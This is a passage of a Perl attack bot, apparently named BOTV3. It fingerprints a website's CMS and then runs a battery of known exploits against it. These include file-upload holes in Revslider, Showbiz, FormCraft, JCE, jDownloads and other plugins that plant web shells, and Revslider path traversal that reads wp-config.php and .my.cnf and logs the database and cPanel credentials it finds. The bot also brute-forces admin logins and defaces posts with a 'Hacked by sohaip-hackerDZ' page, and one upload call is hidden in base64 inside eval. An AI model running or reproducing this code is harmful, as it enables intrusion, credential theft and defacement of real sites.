my $magcms = $ua->get("$magsite")->content;
my $spyxy = $ua->get("$site")->content;
if($spyxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print "[-] $site";  
   print color("bold green"), " - WordPress\n\n";     print color('reset');
open(save, '>>sites/wordpress.txt');
    print save "$site\n";
      close(save);
showbiz();
      #virulaoption();
      wpinjetc();
    revshell();
    gravity();
    upindex();
  getconfig();
    jombmang();
  formcraft();

  

}

elsif($spyxy =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print "[-] $site";  
   print color("bold green"), " - Joomla\n\n";         print color('reset');

open(save, '>>sites/joomla.txt');
    print save "$site\n";
    close(save);
  jceshell();
    comjce();
    comediaindex();
    comjdowloads();
comfabr();
indecomfabr();
mods();


    }
elsif($spyxy =~/Drupal|drupal|sites\/all|drupal.org/) {
print "[-] $site";  
   print color("bold green"), " - Drupal\n\n";     print color('reset');
open(save, '>>sites/DRUPAL.txt');
    print save "$site\n";
    close(save);
     Drupal();

    }elsif($spyxy =~/\/Prestashop|\/js\/jquery\/plugins\/|<meta name=\"Generator\" content=\"Prestashop/) {
  print "[-] $site";  
   print color("bold green"), " - Prestashop\n\n";     print color('reset');

open(save, '>>sites/Prestashop.txt');
    print save "$site\n";
    close(save);
    presta();
    }
elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
print "[-] $site";  
   print color("bold green"), " - Magento\n\n";     print color('reset');

open(save, '>>sites/Magento.txt');
magento();
    print save "$site\n";
    close(save);
    }
  elsif($spyxy =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
  print "[-] $site";  
   print color("bold white"), " - OpenCart\n\n";     print color('reset');

open(save, '>>sites/vbulletin.txt');
    print save "$site\n";
    close(save);
    }elsif($efreez =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/) {
print "[-] $site";  
   print color("bold green"), " - vBulletin\n\n";     print color('reset');

open(save, '>>sites/vbulletin.txt');
    print save "$site\n";
    close(save);
    }
    else{
  print "[-] $site";  
print  color("bold red"), " - Unknown\n\n";     print color('reset');

}
}
######################
######################
######################
###### Drupal ########
######################
######################
######################
sub Drupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"[Drupal] ............................. ";


$drupalink = "http://localhost/drup.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
$admin ="admin";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
    print color('bold green');
print "[Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>BOTV3/brute.txt');
    print save "[Drupal] $site | username : admin | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
    }
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');


        }

}
######################
######################
######################
###### magento ########
######################
######################
######################
sub magento(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"[Magento] ............................ ";


$magentoxlink = "http://localhost/magentox.php";
my $exploitspymag = "$magentoxlink?url=$site&submit=submit";
my $checkksbir = $ua->get("$exploitspymag")->content;
if($checkksbir =~/Success /) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
    open(save, '>>BOTV3/Brute.txt');
    print save "[Magento] $site hydra|hydra77\n";
    close(save);
    }
else{
    print color('bold red');
print  "[Faile]\n";
    print color('reset');


        }

}
#####################
######################
######################
######################
###### jce shell ########
######################
######################
######################
sub jceshell(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print"[Jce Upload Shell] ................... ";


$drupalink = "http://localhost/jce.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/success/) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>BOTV3/Shell3z.txt');
    print save "$site/images/stories/spy3xp.php\n";
    close(save);
    }
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');


        }

}
#####################




sub formcraft(){
print"[FormCraft Upload] ................... ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    upform();
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}

}

sub upform(){
{
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="xx.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzspy = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//xx.php'; 
my $taz = $ua->get("$upzzspy")->content;
if ($taz =~ /sohaip-hackerDZ/){
   print color('bold green');
print "[Success]\n";
print color('reset');

open(save, '>>BOTV3/Shell3z.txt');   
print save "$upzzspy\n";   
close(save);
}else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');}
}

}





######################
######################
######################
###### Jce Img #######
######################
######################
######################




  sub comjce(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
print"[JCE Image Upload] ................... ";


if ($res =~ m/No function call specified!/i){
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["tools/spy.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
    print color('bold red');
print "[Failed]\n ";
    print color('reset');


}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/spy.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
    open(save, '>>BOTV3/index.txt');
    print save "[Defaced JCE] $def\n";
    close(save);
    print color('bold green');
  print "[Success]\n";
    print color('reset');
zoneh();



}

}
else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}
    }

######################
######################
######################
###### Media #######
######################
######################
######################
sub comediaindex(){
print"[Com Media Index] .................... ";
$tarmedia="$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";

$filemedia = "tools/spy.txt";
$indexmedia="$site/images/spy.txt";
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$sorm = $ua->get($tarmedia);
$karza = $sorm->content;
if($karza =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $karza =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
$url = $1;
$url =~ s/&amp;/&/gi;
    my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$filemedia] ]);
 my $check = $ua->get("$indexmedia")->content;
if($check=~/Hacked/ ) {
    print color('bold green');
print "[Sucess]\n";
    print color('reset'); 
        open (TEXT, '>>BOTV3/index.txt');
        print TEXT "[ COM MEDIA Index] => $indexmedia \n";
        close (TEXT);


        $def == $indexmedia;
    zoneh();
        }
    } else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
        }
}

######################
######################
######################
##### Jdownload ######
######################
######################
######################

    sub comjdowloads($site){
print"[comjdowloads Upload] ................ ";


$file="tools/spy.rar";
$filez="tools/spy.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/spy.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"sohaip-hackerDZ", mail=>"moetazbusiness@gmail.com", filetitle =>"sohaip-hackerDZ Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
 

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/sohaip-hackerDZ/) {
    print color('bold green');
print "[Sucess]\n";
    print color('reset');        open (TEXT, '>>BOTV3/Shell3z.txt');
        print TEXT "[ JDWN SHELL] => $shellpath\n";
        close (TEXT);
}

}else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
}


print"[comjdowloads Index ] ................ ";

$def = $site . '/images/jdownloads/screenshots/spy.html.j';
$filee="tools/spy.rar";
$filezz="tools/spy.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"sohaip-hackerDZ", mail=>"moetazbusiness@gmail.com", filetitle =>"sohaip-hackerDZ Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
    print color('bold green');
print "[Success]\n";
    print color('reset');

        open (TEXT, '>>BOTV3/index.txt');
        print TEXT "[ JDWN Index] => $def\n";
        close (TEXT);

zoneh();
}else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
        }
}
else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');

}

    }


####################################################################################################
####################################################################################################
########################################## COM ADS ANAGER ##########################################
####################################################################################################
####################################################################################################
sub comadsmanegr(){
print"[Com Ads Manger ] .................... ";

my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], name => "def.html"]);
if ($exploit->decoded_content =~ /def.html/) {
        open(save, '>>BOTV3/index.txt');   
    print save "[ads] $site\n";   
    close(save);

    $def="$site/tmp/plupload/def.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/sohaip-hackerDZ/) {
    print "[Success]\n ";

    zoneh();
    }
}else{
    print color('bold red');
print "[Failed]\n";
    print color('reset');

;
}
}





####################
#mode exploit ######
####################
   sub mods($site){
print"[mod_simplefileupload ] .............. ";

my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$file="mds_v3.php";
$jdup= $site . '/modules/mod_simplefileuploadv1.3/elements/udd.php';
$shell= $site . '/modules/mod_simplefileuploadv1.3/elements/mds_v3.php';



my $exploit = eval(decode_base64('JGdoLT5wb3N0KCIkamR1cCIsIENvbnRlbnRfVHlwZSA9PiAibXVsdGlwYXJ0L2Zvcm0tZGF0YSIsIENvbnRlbnQgPT4gWyBmaWxlPT5bIiRmaWxlIl0gLCBzdWJtaXQ9PiJVcGxvYWQiIF0pOw=='));


my $check = $gh->get("$shell")->content;
if($check =~/sohaip-hackerDZ/) {
    print color('bold green');
print "[Success]\n";
    print color('reset');
        open (TEXT, '>>BOTV3/Shell3z.txt');
        print TEXT "[ Shell LINK ] => $site/cloudxv3.php\n";
        close (TEXT);
            open (TEXT, '>>BOTV3/index.txt');
            print TEXT "[ Deface Link LINK ] => $site/def.html\n";
        close (TEXT);

    $def =$site .'/def.html';
zoneh();

}
else
{
    print color('bold red');
print "[Failed]\n";
    print color('reset');
}


}




######################
######################
######################
###### Revslider ######
######################
######################
######################
sub getconfig{
print"[Revslider Config] ................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$config = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
$conflink = "$site/$config";
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold green');
print "[Sucess]\n";
    print color('reset');
    print save "[rev cnfg] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $conflink ));
$cont = $resp->content;
while($cont =~ m/DB_NAME/g){


        if ($cont =~ /DB_NAME\', \'(.*)\'\)/){
        print "\t[-]Database Name = $1 \n";
print color 'reset';
        open (TEXT, '>>BOTV3/config.txt');
        print TEXT "\n[ DATABASE ] \n$site\n[-]Database Name = $1";
        close (TEXT);
        }
        if ($cont =~ /DB_USER\', \'(.*)\'\)/){
        print "\t[-]Database User = $1 \n";
print color 'reset';
        open (TEXT, '>>BOTV3/config.txt');
        print TEXT "\n[-]Database User = $1";
        close (TEXT)
        }
        if ($cont =~ /DB_PASSWORD\', \'(.*)\'\)/){
        print "\t[-]Database Password = $1 \n";
print color 'reset';
        $pass= $1 ;
        open (TEXT, '>>BOTV3/config.txt');
        print TEXT "\nDatabase Password = $pass";
        close (TEXT)
        }
        if ($cont =~ /DB_HOST\', \'(.*)\'\)/){
        print "\t[-]Database Host = $1 \n\n";
print color 'reset';
        open (TEXT, '>>BOTV3/config.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

wpbrute();
getcpconfig();
}}else{
    print color('bold red');
   print "[Failed]\n";
    print color('reset');

getcpconfig();

}

}
####################################################################################################
####################################################################################################



sub getcpconfig{
print"[Revslider Cpanel] ................... ";

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g && $cont =~ m/password=/g){
    print color('bold green');
print "[Success]\n";
    print color('reset');

    print save "[rev cpnl] $site\n";   
    close(save);
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

        print "\n\t[-]Cpanel User = $1 \n";
print color 'reset';
        open (TEXT, '>>BOTV3/cp.txt');
        print TEXT "\n[ cpanel ] \n$site\n[-]cpanel user = $1";
        close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
        print "\t[-]Cpanel Pass = $1 \n\n";
print color 'reset';
        open (TEXT, '>>BOTV3/cp.txt');
        print TEXT "\n[-]Cpanel Pass = $1";
        close (TEXT)
        }


}
}else{    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}


}




######################
######################
######################
###### PMA SCAN ######
######################
######################
######################
sub pmaa{
print"[Php My Admin Wp] .................... ";

use HTTP::Request;
use LWP::UserAgent;
@pat=('/phpMyAdmin/','/phpmyadmin/');
foreach $pma(@pat){
chomp $pma;

$url = $site.$pma;
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if ($ar =~ m/Welcome to phpMyAdmin|Username|Password/g){
    print color('bold green');
print "[Success]\n";
    print color('reset');
open (TEXT, '>>BOTV3/config.txt');
print TEXT "\n[PhpMyAdmin] $url \n\n";
close (TEXT);

}else{

    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}}

}
######################
######################
######################
## Wordpress Inject ##
######################
######################
######################
sub opencart{
print"[-] Starting brute force";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$ocuser = admin;
$ocpass = $_;
print "\n[-] Trying: $ocpass ";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print "- ";
print color('bold green'),"FOUND\n";
print color('reset');
open (TEXT, '>>Result.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
next OUTER;
}
}
}
######################
######################
######################
## Wordpress Inject ##
######################
######################
######################
sub wpinjetc($site){
print"[Wordpress Inject] ................... ";

$linkposts = $site . 'index.php/wp-json/wp/v2/posts/';



$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (30);


$sorm = $ua->get($linkposts);
$karza = $sorm->content;
if($karza =~/\/?p=(.*?)\"\}/)
{
$id=$1;
$ajx = $site . '/wp-json/wp/v2/posts/'.$id;



  
$defx="                           <h2><center>sohaip-hackerDZ<center></h2>
            </div>
            <div class=\"post_content\">
              <p><title>HACKED by sohaip-hackerDZ
</title></p>
<div style=\"text-align: center\"><font size=\"6\" face=\"comic sans ms\"><b>Hacked By sohaip-hackerDZ</b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><font color=red>HACKED</font> Msohaip-hackerDZ<font color=red>HACKED</font> sohaip-hackerDZ <font color=red>HACKED</font> sohaip-hackerDZ <font color=red>HACKED</font> sohaip-hackerDZ <font color=red>HACKED</font>sohaip-hackerDZ <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b>thank you gassrini for the tool  <br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b></p>
<p>
            </div>";
$file="spy.html";
$sirina=$id . 'justracccwdata';
$def=  $site . 'spy.html';
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'HACKED by sohaip-hackerDZ', 'slug'=> $file,'content' => $defx];
$response = $ua->request($gassface);
$stat = $response->content;
  if ($stat =~ /sohaip-hackerDZ/){
   print color('bold green');
print "[Succes]\n";
    print color('reset');
            open(save, '>>BOTV3/index.txt');  
    print save "$def\n";  
    close(save);
zoneh();

  }
else{
   print color('bold red');
print "[Failed]\n";
    print color('reset');}
}
else{
   print color('bold red');
print "[Failed]\n";
    print color('reset');}
}



######################
######################
######################
## Wordpress Brute ###
######################
######################
######################
sub wpbrute{
$red = $site . '/wp-admin/';
$wp= $site . 'wp-login.php';
$admin = "admin";

print"[Wordpress Brute] .................... ";


print "\n USER : $admin\nPASSWORD : $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
        if ($stat =~ /302/){
    print color('bold green');
print "[Success]\n";
    print color('reset');
        open (TEXT, '>>BOTV3/brute.txt');
        print TEXT "\n$site/wp-login.php => User :$admin Password:$pass\n";
        close (TEXT);
        }else{
    print color('bold red');
print  "[Failed]\n";
    print color('reset');

}
pmaa();
}

######################
######################
######################
## Revslider Shell ###
######################
######################
######################
sub revshell(){
print"[Revslider Shell] .................... ";

my $path = "wp-admin/admin-ajax.php";


my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["taz.zip"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
    print color('bold green');
print "[Success]\n";
    print color('reset');

my $check = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($check =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');

    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
  $def = "$site/def.html";
  zoneh();
    } else {  }
my $avada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($avada =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
      $def = "$site/def.html";
  zoneh();

}
else {  }
my $striking_r = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($striking_r =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else {  }
my $IncredibleWP = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($IncredibleWP =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else {  }
my $ultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($ultimatum =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else {  }
my $medicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/cloud.php")->content;
if($medicate =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else {  }
my $centum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/cloud.php")->content;
if($centum =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else {  }
my $beach_apollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($beach_apollo =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else { }
my $cuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($cuckootap =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else {  }
my $pindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/cloud.php")->content;
if($pindol =~/sohaip-hackerDZ/) {

    print "[+] pindol successfully uploaded\n";
    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else {  }
my $designplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($designplus =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else {  }
my $rarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($rarebird =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');
    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else {  }
my $andre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($andre =~/sohaip-hackerDZ/) {

      print color('bold yellow');
print "[Uploading Shell] .................... ";
    print color('reset');
      print color('bold green');
print "[Success]\n";
    print color('reset');    open(save, '>>BOTV3/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
    $def = "$site/def.html";
  zoneh();

}
else { }
} else {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}
}
######################
######################
######################
#showbiz
sub showbiz(){
print"[Showbiz] ............................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
sub upxx(){
my $zip_sho = "showbiztaz.zip";
my $action_sho = "showbiz_ajax_action";
my $update_file_sho = "$zip_sho";
my $path = "wp-admin/admin-ajax.php";
my $shell_path_sho = "wp-content/plugins/showbiz/temp/update_extract/showbiz/sxv3.php";

my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "$action_sho", client_action => "update_plugin", update_file => ["$update_file_sho"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/)
        {
        print "[+] Payload Executed Succeflly.\n";
        print "[~] Checking Shell.\n";
    my $conte = $ua->get("$site/$shell_path_sho")->content;
if ($conte =~/sohaip-hackerDZ/){
print color('bold green');
print "[Sucess]\n$site/$shell_path_sho\n";
print color('reset');

                open (DONE, '>>BOTV3/Shell3z.txt');
                print DONE "$site/$shell_path_sho\n";
}
        else
                {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
                }
        }

elsif ($exploit->decoded_content =~ /Wrong request/) {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}

elsif ($exploit->decoded_content =~ m/0$/) {
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}

else {
$exploit->decoded_content =~ /<\/b>(.*?)<br>/;
    print color('bold red');
print  "[Failed]\n";
    print color('reset');
}
}
upxx();



}
######################
######################
######################

sub comfabr(){
print"[Com Fabrik Shell] ................... ";


$comfab= $site . '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1';
$def = $site . '/media/spy.txt';
$fabshell = $site . '/media/cloud.php';
